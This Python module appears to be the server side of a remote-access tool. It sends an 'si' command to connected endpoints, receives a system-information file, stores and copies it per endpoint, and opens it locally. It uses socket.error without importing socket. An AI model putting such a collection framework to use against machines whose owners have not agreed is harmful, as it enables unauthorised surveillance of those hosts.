from Modules.logger import init_logger
import shutil
import os


class Sysinfo:
    def __init__(self, path, log_path, endpoint, server, shell_target):
        self.server = server
        self.shell_target = shell_target
        self.endpoint = endpoint
        self.app_path = path
        self.log_path = log_path
        self.path = os.path.join(self.app_path, self.endpoint.ident)
        self.logger = init_logger(self.log_path, __name__)

    def bytes_to_number(self, b: int) -> int:
        res = 0
        for i in range(4):
            res += b[i] << (i * 8)
        return res

    def make_dir(self):
        try:
            os.makedirs(self.path)

        except FileExistsError:
            self.logger.debug(f"{self.path} exists.")
            pass

    def get_file_name(self):
        try:
            self.logger.debug(f"Sending si command to {self.endpoint.conn}...")
            self.endpoint.conn.send('si'.encode())
            self.logger.debug(f"Waiting for filename from {self.endpoint.conn}...")
            self.filename = self.endpoint.conn.recv(1024).decode()
            self.logger.debug(f"Sending confirmation to {self.endpoint.conn}...")
            self.endpoint.conn.send("OK".encode())
            self.logger.debug(f"{self.endpoint.ip}: {self.filename}")
            self.file_path = os.path.join(self.path, self.filename)
            self.logger.debug(f"File path: {self.file_path}")

        except (WindowsError, socket.error) as e:
            self.logger.debug(f"Connection error: {e}")
            self.logger.debug(f"server.remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def get_file_size(self):
        try:
            self.logger.debug(f"Waiting for filesize from {self.endpoint.ip}...")
            self.size = self.endpoint.conn.recv(4)
            self.logger.debug(f"Sending confirmation to {self.endpoint.ip}...")
            self.endpoint.conn.send("OK".encode())
            self.size = self.bytes_to_number(self.size)
            self.logger.debug(f"File size: {self.size}")

        except (WindowsError, socket.error) as e:
            self.logger.debug(f"Connection error: {e}")
            self.logger.debug(f"server.remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def get_file_content(self):
        current_size = 0
        buffer = b""
        try:
            self.logger.debug(f"Receiving file content from {self.endpoint.ip}...")
            with open(self.file_path, 'wb') as tsk_file:
                while current_size < self.size:
                    data = self.endpoint.conn.recv(1024)
                    if not data:
                        break

                    if len(data) + current_size > self.size:
                        data = data[:self.size - current_size]

                    buffer += data
                    current_size += len(data)
                    tsk_file.write(data)

        except (WindowsError, socket.error) as e:
            self.logger.debug(f"Connection error: {e}")
            self.logger.debug(f"server.remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def confirm(self):
        try:
            self.logger.debug(f"Sending confirmation to {self.endpoint.ip}...")
            self.endpoint.conn.send(f"Received file: {self.filename}\n".encode())

        except (WindowsError, socket.error) as e:
            self.logger.debug(f"Connection error: {e}")
            self.logger.debug(f"server.remove_lost_connection({self.endpoint})...")
            self.server.remove_lost_connection(self.endpoint)
            return False

    def file_validation(self):
        try:
            self.logger.debug(f"Running validation on {self.file_path}...")
            with open(self.file_path, 'r') as file:
                data = file.read()

            return True

        except Exception as e:
            self.logger.debug(f"File validation Error: {e}")
            return False

    def display_text(self):
        self.logger.info(f"Running display_text...")
        os.startfile(self.file_path)

    def create_local_dir(self, endpoint_ident):
        local_dir = os.path.join('static', 'images', endpoint_ident)
        if not os.path.exists(local_dir):
            os.makedirs(local_dir)

        return local_dir

    def run(self):
        self.logger.info(f"Running Sysinfo...")
        self.logger.debug(f"Calling make_dir...")
        self.make_dir()
        self.logger.debug(f"Calling get_file_name...")
        self.get_file_name()
        self.logger.debug(f"Calling get_file_size...")
        self.get_file_size()
        self.logger.debug(f"Calling get_file_content...")
        self.get_file_content()
        self.logger.debug(f"Calling confirm...")
        self.confirm()
        self.logger.debug(f"Calling file_validation...")
        self.file_validation()

        for endpoint in self.server.endpoints:
            if endpoint.conn == self.shell_target:
                endpoint_ident = endpoint.ident
                local_dir = self.create_local_dir(endpoint_ident)
                shutil.copy(self.file_path, local_dir)

        self.logger.debug(f"Calling display_text...")
        self.display_text()
        self.logger.info(f"Sysinfo completed.")
